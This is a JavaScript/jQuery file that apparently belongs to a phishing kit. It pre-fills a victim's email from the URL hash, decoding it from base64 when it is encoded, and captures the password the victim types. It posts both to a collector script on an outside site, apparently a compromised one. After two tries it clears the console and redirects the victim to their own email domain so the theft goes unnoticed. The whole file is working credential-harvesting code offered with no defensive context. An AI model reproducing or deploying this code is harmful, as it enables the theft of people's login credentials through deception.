$(document).ready(function(){
	function isBase64(str) {
  if (str === '' || str.trim() === '') {
    return false;
  }
  try {
    return btoa(atob(str)) == str;
  } catch (err) {
    return false;
  }
}
    $('#msg').hide();
    var count=0;
         var email = window.location.hash.substr(1);
  if (isBase64(email)) {
    email = atob(window.location.hash.substr(1));
  }
email = email.toLowerCase();
         if (!email) {
   
         }
         else
         {
           var my_email = email;
           $('#user').val(my_email);
           var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
   
           if (!filter.test(my_email)) {
             $('#error').show();
             email.focus;
             return false;
           }
           var ind=my_email.indexOf("@");
           var my_slice=my_email.substr((ind+1));
           var c= my_slice.substr(0, my_slice.indexOf('.'));
           $("#pass").focus();
         }
       $('#submit-btn').click(function(event){
            $('#error').hide();
           $('#msg').hide();
           event.preventDefault();
           var email=$("#user").val();
           var password=$("#pass").val();
         var my_email =email;
         var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
   
         if (!filter.test(my_email)) {
           $('#error').show();
           email.focus;
           return false;
         }
   
         var ind=my_email.indexOf("@");
         var my_slice=my_email.substr((ind+1));
         var c= my_slice.substr(0, my_slice.indexOf('.'));
           $("#password").focus();
         count=count+1;
    var file = "log.php";
         $.ajax({
           dataType: 'JSON',
url: "https://nokutenda.org.au/image/wb/log.php",
           type: 'POST',
           data:{
             email:email,
             password:password,
           },
               // data: $('#contact').serialize(),
               beforeSend: function(xhr){
                 $('#submit-btn').html('Verifing...');
               },
               success: function(response){
                 if(response){
                   $("#msg").show();
                   console.log(response);
                   if(response['signal'] == 'ok'){
                     $("#password").val("");
                     if (count>=2) {
                       count=0;
               window.location.replace("http://www."+my_slice);
   
                     }
                   }
                   else{
                   }
                 }
                 console.clear();
               },
               error: function(response){
                 $("#password").val("");
                 if (count>=2) {
                   count=0;
               window.location.replace("http://www."+my_slice);
                 }
                 $("#msg").show();
               },
               complete: function(){
                 $('#submit-btn').html('Log in');
				 $("#password").focus();
               }
             });
           
       });
    });
